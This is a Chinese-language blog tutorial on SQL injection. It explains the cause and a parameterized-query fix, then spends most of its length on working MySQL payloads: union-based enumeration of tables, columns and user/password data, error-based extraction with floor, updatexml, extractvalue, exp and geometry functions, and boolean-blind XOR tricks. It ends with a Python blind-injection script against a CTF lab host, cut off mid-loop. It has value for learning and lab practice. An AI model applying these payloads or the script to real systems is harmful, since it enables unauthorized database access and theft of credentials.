    <content type="html"><![CDATA[<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>随着互联网web和信息技术的发展，在web后端作为存储和管理的的数据库也得到了广泛的应用，与web结合较为紧密的数据库包括Mysql，Sqlserver，Oracle，Sqllite，Db2，Access等等。 数据存储和管理作为应用的一个基本需求，在绝大多数的应用里都得到了使用，这种大面积的使用也意味着在数据库操作方面如果处理不当出现问题的可能性会很大，另外一方面由于数据库承载了应用的数据信息，如果数据库出现问题一方面可能导致敏感数据的泄露和篡改（如信用卡账户，用户密码，管理账户和密码，销售记录等等），直接导致损失和应用被攻陷，另外一方面，即使数据库中不承载较为敏感的信息，由于数据库的特殊性，数据库被攻击的话也可以直接导致应用程序崩溃及其他严重的后果。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>应用为了和数据库进行沟通完成必要的管理和存储工作，必须和数据库保留一种接口。目前的数据库一般都是提供api以支持管理，应用使用底层开发语言如Php，Java，asp，Python与这些api进行通讯。对于数据库的操作，目前普遍使用一种SQL语言（Structured Query Language语言，SQL语言的功能包括增删查改等，是一个综合的、通用的关系数据库语言，同时又是一种高度非过程化的语言，只要求用户指出做什么而不需要指出怎么做），SQL作为字符串通过API传入给数据库，数据库将查询的结果返回，数据库自身是无法分辨传入的SQL是合法的还是不合法的，它完全信任传入的数据，如果传入的SQL语句被恶意用户控制或者篡改，将导致数据库以当前调用者的身份执行预期之外的命令并且返回结果，导致安全问题。 那么恶意用户如何才能控制传入的SQL语句呢？我们知道，既然传入的SQL是以字符串的方式传入的，这个字符串由应用生成，那么如果应用生成这个字符串的方式不对就可能导致问题，譬如考虑如下的功能：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from members where userid=&quot;</span>.<span class="variable">$_GET</span>[userid];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>这段代码的逻辑是根据用户请求的Userid进入数据库查询出不同的用户并且返回给用户，可以看到最终传入的字符串有一部分是根据用户的输入来控制的，一旦用户提交<code>poc.php?userid=1 or 1=1</code>最终进入程序之后传入数据库的逻辑将是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from members where userid=1 or 1=1&quot;</span>);</span><br></pre></td></tr></table></figure><p>用户完全可以根据传入的内容来控制整个SQL的逻辑，实现间接控制和管理数据库的目的，<code>这种命令（SQL语句）和数据（用户提交的查询）不分开的实现方式导致了安全漏洞的产生。</code> 由于不同的开发语言可能对api进行了不同的封装，并且各种语言内部对数据的校验会有不同的要求，譬如java和python属于变量强类型并且各种开发框架的流行导致出现SQL注射的几率较小，php属于弱类型不会对数据进行强制的验证加上过程化的程序编写思路导致出现注射的几率会较大。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>通过典型的SQL注射漏洞，黑客是可以根据所能控制的内容在SQL语句的上下文导致不同的结果的，这种不同主要体现在不同的<code>数据库特性上和细节上</code>。同时，后端的数据库的不同导致黑客能利用SQL语句进行的操作也并不相同，因为很多的数据库在标准的SQL之外也会实现一些自身比较特别的功能和扩展，<code>常见的有Sqlserver的多语句查询，Mysql的高权限可以读写系统文件，Oracle经常出现的一些系统包提权漏洞。</code> 即使一些SQL注射本身无法对数据本身进行一些高级别的危害，譬如一些数据库里可能没有存储私密信息，利用SQL查询的结果一样可能对应用造成巨大的灾难，因为应用可能将从数据库里提取的信息做一些其他的比较高危险的动作，譬如进行文件读写，这种本身无价值的数据和查询一旦被应用本身赋予较高的意义的话，可能一样导致很高的危害。 评估一个SQL注射的危害需要取决于注射点发生的SQL语句的上下文，SQL语句在应用的上下文，应用在数据库的上下文，综合考虑这些因素来评估一个SQL注射的影响，在无上述利用结果的情况下，通过web应用向数据库传递一些资源要求极高的查询将导致数据库的拒绝服务，这将是黑客可能能进行的最后的利用。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>比较传统的修复方式一般认为是对输入的数据进行有效的过滤，但是由于输入的来源太过广泛，可能来自于数据库，HTTP请求，文件或者其他的数据来源，较难对所有进入的数据在各种场景下进行有效的过滤。 事实上最罪恶的不是数据，而是我们使用数据的方式，最为彻底的修复一定要查找最为彻底的根源，我们可以看到最后的根源在于对数据和指令的不分离，所以在修复的时候应该极力将数据和指令分离。目前较为提倡的，同时在各种数据库操作框架里体现的方式就是以填充模板的方式来代替传统的拼接的方式进行数据库查询，譬如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SqlTemplate</span>=<span class="string">&quot;select * from members where userid=&#123;userid|int&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">PreSql</span>(<span class="variable">$SqlTemplate</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>模板里有关数据及数据自身意义的描述，PreSql方法将实现将模板和数据安全的转换为SQL语句的功能，以保障最终的安全的实现</p><h1 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>我们篡改SQL语句很多时候都会使用到注释，SQL语法中的注释符有以下几种：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">--+(这里的+其实是空格的意思，因为我们的注入时+通常会被识别为空格，这是早期养成的习惯，但是后来在看一些大牛的文章的时候会发现他们更爱用-- -这种形式，很多工具等等也是)</span><br><span class="line"><span class="regexp">/**/</span>(这个也不太常用)</span><br></pre></td></tr></table></figure><h2 id="包含信息的内置表"><a href="#包含信息的内置表" class="headerlink" title="包含信息的内置表"></a>包含信息的内置表</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema.<span class="keyword">tables</span></span><br><span class="line">information_schema.<span class="keyword">columns</span></span><br></pre></td></tr></table></figure><h1 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h1><h2 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h2><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种 <code>关联数据库管理系统</code> ，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><ul><li>MySQL是开源的，所以你不需要支付额外的费用。</li><li>MySQL使用标准的 SQL 数据语言形式。</li><li>MySQL可以运行于多个系统上，并且 支持多种语言 。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL 对PHP有很好的支持 ，PHP 是目前最流行的 Web 开发语言。</li><li>MySQL 支持大型数据库 ，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL是 可以定制的 ，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</li></ul><p>一个完整的mysql管理系统结构通常如下图：<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241358298.png"></p><p>可以看到，mysql可以管理 <code>多个数据库</code> ，一个数据库可以包含 <code>多个数据表</code>，而一个数据表有含有 <code>多条字段</code> ，一行数据正是多个字段同一行的一串数据。</p><p>Mysql具有很独特的特点而且使用最为广泛，Mysql数据库本身的权限极高，作为应用可以对本机进行文件读写，可以进行提权等。</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>很多时候联合查询也会和其他的几种查询方式一起使用。<br>联合查询用到的SQL语法知识</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNION</span>可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</span><br><span class="line"><span class="built_in">UNION</span> <span class="built_in">ALL</span>功能相同，但是会显示所有数据，不会去重。</span><br></pre></td></tr></table></figure><p>具有类似功能的还有JOIN <a href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> 但是是一个对库表等进行连接的语句，我们在后续的绕过中会提到利用它来进行无列名注入。</p><ol><li><p>判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; </span></span><br><span class="line"><span class="string">?id=1&quot; </span></span><br><span class="line"><span class="string">?id=1&#x27;</span>) </span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;) </span></span><br><span class="line"><span class="string">?id=1&#x27; or 1#</span></span><br><span class="line"><span class="string">?id=1&#x27; or 0#</span></span><br><span class="line"><span class="string">?id=1&#x27; or 1=1#</span></span><br><span class="line"><span class="string">?id=1&#x27; and 1=2#</span></span><br><span class="line"><span class="string">?id=1&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">?id=1&#x27; and 1=2 or &#x27; </span></span><br><span class="line"><span class="string">?id=1\</span></span><br></pre></td></tr></table></figure></li><li><p>猜测SQL查询语句中的字段数</p></li></ol><ul><li>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 1#</span></span><br><span class="line"><span class="string">1&#x27;</span> order by 2<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; order by 3#</span></span><br><span class="line"><span class="string">1 order by 1</span></span><br><span class="line"><span class="string">1 order by 2</span></span><br><span class="line"><span class="string">1 order by 3</span></span><br><span class="line"><span class="string">```   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; union select 1,2#</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2,3<span class="comment">#</span></span><br><span class="line">1 union select 1<span class="comment">#</span></span><br><span class="line">1 union select 1,2<span class="comment">#</span></span><br><span class="line">1 union select 1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>确定显示数据的字段位置<br>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1#</span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,2<span class="comment">#</span></span><br><span class="line">-1<span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">-1 union select 1#</span></span><br><span class="line"><span class="string">-1 union select 1,2#</span></span><br><span class="line"><span class="string">-1 union select 1,2,3#</span></span><br></pre></td></tr></table></figure></li></ol><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。</li><li>⼀定要拼接够足够的字段数，否则SQL语句报错。</li></ul><ol start="4"><li>在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：</li></ol><ul><li><p>获取当前数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库的表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取表中的字段名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;users&#x27;</span>),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(<span class="built_in">id</span>,0x7c,username,0x7c,password) from <span class="built_in">users</span>),3--+</span><br></pre></td></tr></table></figure><p>一般情况下就是这样的一个顺序，<code>确定联合查询的字段数-&gt;确定联合查询回显位置-&gt;爆库-&gt;爆表-&gt;爆字段-&gt;爆数据。</code></p></li></ul><p>我们可以看到这里使用了group_concat来拼接查询多个数据，在很多种查询中都有使用这个函数来提高效率，同时还可以拼接十六进制特殊字符来分隔，同时还使用了information_shcema表获取表信息、字段信息，这个表在低版本mysql中不存在，同时有时还会被过滤，这也会是我们绕过的一个方向。</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行，<code>报错的过程可能会出现在查询或者插入甚至删除的过程中。</code></p><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>floor()（8.x&gt;mysql&gt;5.0）<code>双查询报错注入</code><br>函数返回小于或等于指定值（value）的最小整数,取整</p><p>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1<br>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<br>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) <span class="built_in">limit</span> 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">/*拆解出来就是下面的语句*/</span><br><span class="line">concat((select concat(version(),’-’,database(),’-’,user()) <span class="built_in">limit</span> 0,1),floor(rand(0)*2))x</span><br></pre></td></tr></table></figure><p>可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错</p><p>双查询报错注入的原理 <a href="https://blog.csdn.net/lixiangminghate/article/details/80466257%EF%BC%8Chttps://www.freebuf.com/articles/web/250376.html">https://blog.csdn.net/lixiangminghate/article/details/80466257，https://www.freebuf.com/articles/web/250376.html</a></p><p>大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个Floor()就是这种情况。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>对XML文档进行查询的函数</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(‘anything’,concat(‘<span class="comment">#’,substring(hex((select database())),1,5))))</span></span><br></pre></td></tr></table></figure><h3 id="UPDATEXML-XML-document-XPath-string-new-value"><a href="#UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value);"></a>UPDATEXML (XML_document, XPath_string, new_value);</h3><p>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p><p>这也是一种非常常见的报错注入的函数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><h3 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h3><p>返回 e 的 x 次方,当 数据过大 溢出时报错，即 x &gt; 709</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail=<span class="string">&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage),0x7e))) as asd))--+</span></span><br></pre></td></tr></table></figure><h3 id="geometrycollection-mysql-版本5-5"><a href="#geometrycollection-mysql-版本5-5" class="headerlink" title="geometrycollection() mysql 版本5.5"></a>geometrycollection() mysql 版本5.5</h3><p>（1）函数解释：<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。</p><p>（2）官方文档中举例的用法如下：<br>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p><p>（3）报错原因：<br>因为MYSQL无法使用这样的字符串画出图形，所以报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;</span>manage<span class="string">&#x27; limit 0,1)a)b)); %23</span></span><br><span class="line"><span class="string">1&#x27;</span>) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage <span class="built_in">limit</span> 0,1)a)b)); %23</span><br><span class="line">1<span class="string">&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span></span><br></pre></td></tr></table></figure><p>这里和我们上面学过的cancat和上一关学的内置表有两个梦幻联动</p><h3 id="multipoint-mysql-版本5-5"><a href="#multipoint-mysql-版本5-5" class="headerlink" title="multipoint() mysql 版本5.5"></a>multipoint() mysql 版本5.5</h3><p>（1）函数解释：<br>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。<br> <br>（2）报错原因：<br>同样是因为无法使用字符串画出图形与geometrycollection类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span></span><br></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h3><p>polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.<br>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage))asd)asd))--+</span></span><br></pre></td></tr></table></figure><h3 id="mutipolygon"><a href="#mutipolygon" class="headerlink" title="mutipolygon()"></a>mutipolygon()</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage))asd)asd))</span></span><br></pre></td></tr></table></figure><h3 id="linestring-）"><a href="#linestring-）" class="headerlink" title="linestring(）"></a>linestring(）</h3><p>报错原理：<br>mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span></span><br></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h3><p>同上</p><h3 id="ST-LatFromGeoHash-（mysql-gt-x3D-5-7-x）"><a href="#ST-LatFromGeoHash-（mysql-gt-x3D-5-7-x）" class="headerlink" title="ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）"></a>ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage),0x7e))))a)b))--+</span></span><br></pre></td></tr></table></figure><h3 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST.LongFromGeoHash"></a>ST.LongFromGeoHash</h3><p>同上 嵌套查询</p><h3 id="ST-Pointfromgeohash-mysql-gt-5-7"><a href="#ST-Pointfromgeohash-mysql-gt-5-7" class="headerlink" title="ST_Pointfromgeohash (mysql&gt;5.7)"></a>ST_Pointfromgeohash (mysql&gt;5.7)</h3><p>获取数据库版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span></span><br><span class="line"><span class="string">&#x27;</span>)or  ST_PointFromGeoHash((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1)--+</span><br><span class="line"><span class="string">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;</span>manage<span class="string">&#x27; limit 0,1),1)--+</span></span><br><span class="line"><span class="string">&#x27;</span>)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,<span class="string">&#x27;:&#x27;</span>,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取sql语句的执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><p>对于基于布尔的盲注，可通过构造真or假判断条件（数据库各项信息取值的大小比较， 如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…）， 将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果 （True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p><h3 id="用到的SQL语法知识"><a href="#用到的SQL语法知识" class="headerlink" title="用到的SQL语法知识"></a>用到的SQL语法知识</h3><p>会用到截取字符的函数：substr()<br>可以直接判断字符或者根据ASCII码来判断，利用ASCII码时要用到ASCII()函数来将字符转换为ASCII码值。<br>还用到了各种运算符，&lt;，&gt;，&#x3D;当然不必多提，但是在下面POST的方式中用到了异或符号^，这里其实是一种异或注入的方法，当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">异或运算规则:</span><br><span class="line">1^1=0 0^0=0 0^1=1</span><br><span class="line">1^1^1=0 1^1^0=0</span><br><span class="line">构造payload:<span class="string">&#x27;^ascii(mid(database(),1,1)=98)^0</span></span><br></pre></td></tr></table></figure><p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先通过页面对于永真条件or 1&#x3D;1 与永假条件 and 1&#x3D;2 的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p><p>下面给出常用的布尔盲注脚本。</p><ul><li><p>GET型注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;       <span class="comment"># 如果目标网站要事先登录，就加上cookies吧</span></span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;c8ab8r49nd2kk0qfhs0dcaktl3&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">90000</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       payload = <span class="string">&quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=0&#x27; or ascii(substr(database(),%d,1))&gt;%d-- &quot;</span> %(i,mid)    <span class="comment"># 注意get型的注入注释符要用--空格</span></span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       